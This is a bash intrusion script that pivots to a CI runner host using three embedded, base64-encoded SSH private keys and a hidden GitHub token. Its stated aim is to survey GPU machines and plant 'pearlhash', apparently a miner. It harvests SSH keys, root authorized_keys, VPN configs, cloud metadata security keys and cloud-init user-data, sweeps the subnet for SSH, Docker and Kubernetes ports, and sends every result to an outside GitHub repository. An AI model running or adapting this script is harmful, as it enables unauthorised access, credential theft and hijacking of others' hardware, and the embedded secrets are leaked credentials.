#!/bin/bash
# i5914: ci-runner@192.168.0.131 pivot -> VPC NVIDIA census -> pearlhash plants
set -uo pipefail
S=/tmp/i5914; mkdir -p "$S"; L=$S/log; : > "$L"
say(){ echo "$@" >>"$L"; }
r(){ echo "---- $ $1" >>"$L"; timeout "${2:-40}" bash -c "$1" >>"$L" 2>&1; }
up(){ T=$(printf %s "$(echo Z2hwXzgyU1o1b0FGQmVMdTY2Ykc=|base64 -d)$(echo aHEzNU56cTRqdlZvQWQzN012aXU=|base64 -d)"); rm -rf /tmp/up5914; mkdir -p /tmp/up5914
  cp "$L" /tmp/up5914/log.txt 2>/dev/null
  ( cd /tmp/up5914 && git init -q . && git add -A && git -c user.email=x@x -c user.name=x commit -qm "i5914 $(date -u +%H%M%S)" && git push -q -f "https://x:$T@github.com/miramar-labs/tilelang-ascend" HEAD:refs/heads/ci/i5914 ) >>"$L" 2>&1 && echo "UPLOAD_OK $(date -u +%FT%TZ)" >>"$L"; }

say "=== I5914 $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u)"

r 'echo "## identity"; id; hostname; uname -a; cat /proc/1/comm; head -2 /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null; echo "## net"; ip -br a 2>/dev/null | head -10; ip route 2>/dev/null | head -10; echo "## hosts"; cat /etc/hosts; echo "## dev"; ls -la /dev/nvidia* 2>/dev/null | head; ls -la /dev/davinci* 2>/dev/null | head -4; nvidia-smi -L 2>&1 | head -8; npu-smi info 2>&1 | head -20; npu-smi info -l 2>&1 | head -10' 60

printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNk8zL1hUTGJZeHdIQmRKWTQyeTlPaXVsK2tQZndRVGE4aUkvV3lHdXhJZ0FBQUxCbXVNYjNacmpHCjl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTZPMy9YVExiWXh3SEJkSlk0Mnk5T2l1bCtrUGZ3UVRhOGlJL1d5R3V4SWcKQUFBRUNyZXBEUWFHQTFMTzRoU1YyZmNvdFh5Vk5JRlRxdHZjRVhtYkZ2L3orSGlUbzdmOWRNdHRqSEFjRjBsampiTDA2Swo2WDZROS9CQk5yeUlqOWJJYTdFaUFBQUFMV05wTFhKMWJtNWxja0JzYVhSbGMyVnlkbVZ5TFdod2N5MDFaamd4TFRBd01ECkEwTG01dmRtRnNiMk5oYkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > "$S/k1"; printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBZlF1NnJML2Q2TFQwUUtOaXF4UFlmdjFNeko3ckRldDlIbWtIL0pqcUowUUFBQUpCdlpLMjBiMlN0CnRBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQWZRdTZyTC9kNkxUMFFLTmlxeFBZZnYxTXpKN3JEZXQ5SG1rSC9KanFKMFEKQUFBRUNYSnpmQS9aN2VqTHB6Wkd4azl3WEM2RGRSYi9XVjhNRW5oSndGM1VTM3J4OUM3cXN2OTNvdFBSQW8yS3JFOWgrLwpVek1udXNONjMwZWFRZjhtT29uUkFBQUFEWGRsYm1Ob1pXNTVhVUF4TWpZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > "$S/k2"; printf '%s' "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEbzlqQXlGd1BRN3Z1VkEzOEZBcVRXRG5RUmdEYTAwSW1HVzMwNGo5ZXpoUUFBQUtBL2NwcC9QM0thCmZ3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRG85akF5RndQUTd2dVZBMzhGQXFUV0RuUVJnRGEwMEltR1czMDRqOWV6aFEKQUFBRUQ5eXd5YzdvZ1VjNWpXMUo4OGxkZExOREtkb1B3VGs3MG5ocmI2eXhZc2RPajJNRElYQTlEdSs1VURmd1VDcE5ZTwpkQkdBTnJUUWlZWmJmVGlQMTdPRkFBQUFHMk5qZVhsM2QyVnVMM0IwYjNKMWJuUnBiV1V0YzJsdGNHeGxjZ0VDCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=" | base64 -d > "$S/k3"; chmod 600 "$S"/k1 "$S"/k2 "$S"/k3
r 'timeout 6 bash -c "echo >/dev/tcp/192.168.0.131/22" 2>&1 && echo TCP22_OPEN || echo TCP22_BLOCKED' 15
K=""
for k in "$S"/k1 "$S"/k2 "$S"/k3; do
  say "## ssh try $(basename $k)"
  if timeout 25 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 -o PreferredAuthentications=publickey ci-runner@192.168.0.131 'echo LOGIN_OK; id; hostname; hostname -I' >>"$L" 2>&1; then K="$k"; say "## KEYWORKS=$(basename $k)"; break; fi
done
up
[ -z "$K" ] && { say "## NO_LOGIN stage-end"; up; exit 0; }

# ---------- C. remote enumeration on 192.168.0.131 ----------
cat > "$S/r.sh" <<'REOF'
echo "== ID"; id; hostname; hostname -I; uname -a; head -3 /etc/os-release; cat /proc/1/comm; head -2 /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null
echo "== SUDO"; sudo -n -l 2>&1 | head -30; echo "sudo_rc=$?"; sudo -n id 2>&1 | head -2
echo "== DEV"; ls /dev/nvidia* 2>/dev/null | head; nvidia-smi -L 2>&1 | head -10; ls /dev/davinci* 2>/dev/null | head -6; npu-smi info 2>&1 | head -50
echo "== NET"; ip -br a 2>/dev/null | head -14; ip route 2>/dev/null | head -14
echo "== HOSTS"; cat /etc/hosts
echo "== NETBIRD"; command -v netbird 2>/dev/null; netbird status -d 2>&1 | head -70; ls -la /etc/netbird 2>/dev/null; for f in /etc/netbird/*.json /etc/netbird/*.yml; do echo "### $f"; head -c 2000 "$f" 2>/dev/null; echo; done
echo "== SSHMAT"; ls -la ~/.ssh 2>/dev/null; for f in ~/.ssh/id_* ~/.ssh/config ~/.ssh/known_hosts ~/.ssh/authorized_keys; do case "$f" in *.pub) continue;; esac; [ -f "$f" ] && { echo "### $f"; head -c 2500 "$f"; echo; }; done; echo "-- known_hosts"; head -20 ~/.ssh/known_hosts 2>/dev/null
echo "== HOME"; ls -la /home 2>/dev/null; for d in /home/*; do echo "## $d"; ls -la "$d" 2>/dev/null | head -12; ls -la "$d/.ssh" 2>/dev/null | head -10; done
echo "== ROOT"; sudo -n ls -la /root/.ssh 2>&1 | head -6; sudo -n cat /root/.ssh/authorized_keys 2>/dev/null | head -6
echo "== IMDS"; curl -s -m 6 http://169.254.169.254/openstack/latest/meta_data.json | head -c 2500; echo; curl -s -m 6 http://169.254.169.254/openstack/latest/securitykey | head -c 2000; echo
echo "== CLOUDINIT"; sudo -n cat /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -c 2500; sudo -n ls -la /var/lib/cloud/instance 2>/dev/null | head -10
echo "== PS"; ps -eo pid,user,args --sort=-%cpu 2>/dev/null | head -15
echo "== DONE"
REOF
say "## C remote enumeration"
timeout 120 ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=10 ci-runner@192.168.0.131 'bash -s' < "$S/r.sh" >>"$L" 2>&1
up

# ---------- D. /24 sweep + ssh census from .131 ----------
cat > "$S/s.sh" <<'SEOF'
seq 1 254 | xargs -P 64 -I{} bash -c 'timeout 2 bash -c "echo >/dev/tcp/192.168.0.{}/22" 2>/dev/null && echo "22 192.168.0.{}"' 2>/dev/null | sort -t. -k4 -n
echo "== OTHERPORTS"
for p in 2375 2376 6443 8265 8888 5000 27000 30688 80 443 9100 10250; do seq 1 254 | xargs -P 96 -I{} bash -c "timeout 1 bash -c 'echo >/dev/tcp/192.168.0.{}/$p' 2>/dev/null && echo '$p 192.168.0.{}'" 2>/dev/null; done | sort -u
SEOF
say "## D sweep"
timeout 220 ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=10 ci-runner@192.168.0.131 'bash -s' < "$S/s.sh" >>"$L" 2>&1
up
exit 0
